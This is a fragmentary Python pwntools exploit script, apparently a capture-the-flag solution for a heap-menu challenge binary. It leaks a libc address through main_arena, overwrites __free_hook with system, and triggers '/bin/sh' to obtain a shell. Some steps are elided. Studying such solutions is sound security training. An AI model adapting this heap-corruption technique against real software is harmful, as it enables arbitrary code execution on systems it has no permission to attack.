...
def add_person(name='a'*8, sex='W', info=b'a'*0x70):
    global io
...
def show_info(idx:int):
    global io
    io.sendlineafter("Give me your choice : \n",'2')
    io.sendlineafter("Give me your index : \n", str(idx))
    msg = io.recvuntil("add a person\n")
    log.info("recv msg:{}".format(msg))
    return msg

def edit_doc(idx:int, info=b'a'*0x70):
    # 只能修改1次
    global io
    io.sendlineafter("Give me your choice : \n",'3')
    io.sendlineafter("Give me your index : \n", str(idx))
    io.sendafter("Are you sure change sex?\n", 'Y')
    io.sendafter("Now change information\n", info)


def remove_doc(idx:int):
    global io
    io.sendlineafter("Give me your choice : \n",'4')
    io.sendlineafter("Give me your index : \n", str(idx))
...
msg = show_info(0)
leak_addr = msg[:6]
main_arena = u64(leak_addr + b'\x00\x00') - 88
...
add_person(name='/bin/sh\x00') # 2
add_person() # 3

edit_doc(0, p64(0) + p64(0x21) + p64(free_hook_addr-0x20) + p64(1) + 0x50 * b'a')

edit_doc(3, p64(system_addr) * 2  * 7)
